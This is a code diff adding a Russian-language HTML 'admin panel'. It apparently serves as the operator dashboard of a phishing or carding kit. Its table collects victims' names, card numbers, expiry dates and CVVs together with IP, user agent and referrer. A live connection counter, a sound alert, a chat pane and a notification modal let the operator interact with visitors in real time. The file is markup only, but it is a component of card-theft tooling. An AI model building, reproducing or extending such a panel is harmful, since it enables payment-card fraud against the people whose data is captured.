@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Панель администратора</title>
+    <link rel="stylesheet" href="/admin/styles.css">
+</head>
+
+<body class="dark-theme">
+    <header class="admin-header">
+        <div class="header-left">
+            <div class="connections-counter">
+                <span class="counter-icon">🔌</span>
+                <span id="connections-count">0</span> активных
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="search-box">
+                <input type="text" placeholder="Поиск...">
+            </div>
+            <button class="sound-toggle">Звук вкл.</button>
+        </div>
+    </header>
+
+    <div class="admin-container">
+        <main class="main-content">
+            <div class="data-section">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Имя</th>
+                            <th>Номер карты</th>
+                            <th>Срок</th>
+                            <th>CVV</th>
+                            <th>Дата</th>
+                            <th>IP</th>
+                            <th>User Agent</th>
+                            <th>Реферер</th>
+                            <th>Действия</th>
+                        </tr>
+                    </thead>
+                    <tbody id="card-list">
+                        <!-- Данные будут добавлены через JavaScript -->
+                    </tbody>
+                </table>
+            </div>
+        </main>
+
+        <div id="chat-container" class="chat-container">
+            <div class="chat-header">
+                <h3>Чат</h3>
+            </div>
+            <div id="chat-messages" class="chat-messages"></div>
+            <div class="chat-input">
+                <input type="text" id="chat-message" placeholder="Введите сообщение...">
+                <button id="send-message">Отправить</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для ввода сообщения -->
+    <div id="message-modal" class="modal">
+        <div class="modal-content">
+            <h3>Введите сообщение</h3>
+            <textarea id="notification-text" placeholder="Введите текст уведомления..." rows="4"></textarea>
+            <div class="modal-buttons">
+                <button id="send-notification" class="modal-button">Отправить</button>
+                <button id="cancel-notification" class="modal-button cancel">Отмена</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/admin/script.js"></script>
+</body>
+
+</html>
